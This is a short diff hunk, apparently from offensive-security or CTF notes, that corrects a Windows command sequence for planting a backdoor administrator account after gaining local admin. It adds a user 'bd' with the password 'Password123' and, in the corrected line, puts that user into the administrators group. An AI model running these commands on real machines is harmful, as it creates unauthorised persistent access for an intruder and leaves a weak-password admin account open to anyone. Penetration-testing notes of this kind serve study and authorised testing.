@@ -5,7 +5,7 @@ IMPORTANT!!!!! : WHEN YOU GET LOCAL ADMIN, ADD A BACKDOOR LOCAL ADMIN ACCOUNT FO
 
 net user /add bd Password123
 
-net localgroup administrators bd
+net localgroup administrators /add bd
 
 UNPRIVILEGED.
 
